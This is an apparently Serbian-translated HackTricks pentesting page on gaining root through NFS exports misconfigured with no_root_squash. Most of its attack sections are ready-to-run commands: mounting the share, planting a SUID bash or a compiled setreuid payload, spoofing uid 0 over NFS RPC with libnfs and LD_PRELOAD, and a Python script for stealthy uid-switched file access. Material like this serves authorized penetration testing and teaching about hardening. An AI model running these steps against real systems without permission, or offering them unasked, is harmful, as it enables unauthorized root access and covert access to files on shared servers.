# Eskalacija privilegija zbog NFS pogrešne konfiguracije No Root Squash

{{#include ../../banners/hacktricks-training.md}}


## Osnovne informacije o Squashing-u

NFS će obično (posebno na linux sistemima) verovati navedenim `uid` i `gid` vrednostima klijenta koji se povezuje radi pristupa datotekama (ako se ne koristi kerberos). Međutim, na serveru se mogu podesiti neke konfiguracije koje **menjaju ovo ponašanje**:

- **`all_squash`**: Squash-uje sve pristupe tako što svakog korisnika i grupu mapira na **`nobody`** (65534 unsigned / -2 signed). Zbog toga su svi `nobody` i ne koriste se korisnici.
- **`root_squash`/`no_all_squash`**: Ovo je podrazumevano ponašanje na Linux-u i **squash-uje samo pristup sa uid 0 (root)**. Zbog toga se svakom `UID` i `GID` veruje, ali se `0` mapira na `nobody` (pa impersonacija root korisnika nije moguća).
- **``no_root_squash`**: Ako je ova konfiguracija omogućena, čak se ni root korisnik ne squash-uje. To znači da, ako mount-ujete direktorijum sa ovom konfiguracijom, možete da mu pristupite kao root.

U datoteci **/etc/exports**, ako pronađete direktorijum konfigurisan sa **no_root_squash**, možete mu **pristupiti** kao **klijent** i **pisati unutar** tog direktorijuma **kao** da ste lokalni **root** te mašine.

Za više informacija o **NFS-u** pogledajte:


{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Eskalacija privilegija

### Remote Exploit

Opcija 1 sa korišćenjem bash-a:
- **Mount-ovanje tog direktorijuma** na klijentskoj mašini, a zatim **kopiranje**, kao root korisnik, binarne datoteke **/bin/bash** unutar mount-ovanog direktorijuma i dodeljivanje **SUID** privilegija, nakon čega se ta bash binarna datoteka izvršava na **victim** mašini.
- Imajte na umu da, kako biste bili root unutar NFS share-a, na serveru mora biti konfigurisano **`no_root_squash`**.
- Međutim, ako nije omogućeno, možete eskalirati na drugog korisnika tako što ćete kopirati binarnu datoteku na NFS share i dodeliti joj SUID permission kao korisnik na kog želite da eskalirate.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2 korišćenjem kompajliranog C koda:
- **Montiranje tog direktorijuma** na klijentskoj mašini, a zatim **kao root kopiranje** našeg kompajliranog payload-a unutar montiranog foldera, koji će zloupotrebiti SUID permission, dodeliti mu **SUID** prava i **execute** taj binary sa **victim** mašine (neke [C SUID payload-e](../processes-crontab-systemd-dbus/payloads-to-execute.md#c) možete pronaći ovde).
- Ista ograničenja kao i ranije
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Lokalni Exploit

> [!TIP]
> Imajte na umu da, ako možete da kreirate **tunel od svoje mašine do mašine žrtve, i dalje možete koristiti Remote verziju za exploit ovog privilege escalation-a prosleđivanjem potrebnih portova kroz tunel**.\
> Sledeći trik je potreban u slučaju da fajl `/etc/exports` **navodi IP adresu**. U tom slučaju **ni u kom slučaju nećete moći da koristite** **remote exploit** i moraćete da **iskoristite ovaj trik**.\
> Još jedan uslov potreban za funkcionisanje exploita jeste da **export unutar `/etc/export`** **mora koristiti `insecure` flag**.\
> --_Nisam siguran da li će ovaj trik funkcionisati ako `/etc/export` navodi IP adresu_--

### Osnovne informacije

Scenario podrazumeva exploitovanje montiranog NFS share-a na lokalnoj mašini, uz korišćenje propusta u NFSv3 specifikaciji koji klijentu omogućava da navede svoj uid/gid, čime potencijalno može da dobije neovlašćen pristup. Exploit podrazumeva korišćenje biblioteke [libnfs](https://github.com/sahlberg/libnfs), koja omogućava falsifikovanje NFS RPC poziva.

#### Kompajliranje biblioteke

Koraci za kompajliranje biblioteke mogu zahtevati izmene u zavisnosti od verzije kernela. U ovom konkretnom slučaju, fallocate syscall-ovi su zakomentarisani. Proces kompajliranja podrazumeva sledeće komande:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Sprovođenje exploit-a

Exploit podrazumeva kreiranje jednostavnog C programa (`pwn.c`) koji povećava privilegije na root i zatim izvršava shell. Program se kompajlira, a rezultujući binary (`a.out`) postavlja se na share sa suid root, koristeći `ld_nfs.so` za lažiranje uid-a u RPC pozivima:

1. **Kompajlirajte exploit kod:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Postavite exploit na deljeni resurs i izmenite njegove dozvole lažiranjem uid-a:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Izvršite exploit da biste dobili root privilegije:**
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell za stealthy pristup fajlovima

Kada se dobije root pristup, za interakciju sa NFS share-om bez promene vlasništva (kako bi se izbeglo ostavljanje tragova), koristi se Python skripta (`nfsh.py`). Ova skripta podešava uid tako da odgovara uid-u fajla kojem se pristupa, čime omogućava interakciju sa fajlovima na share-u bez problema sa dozvolama:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Pokreni ovako:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
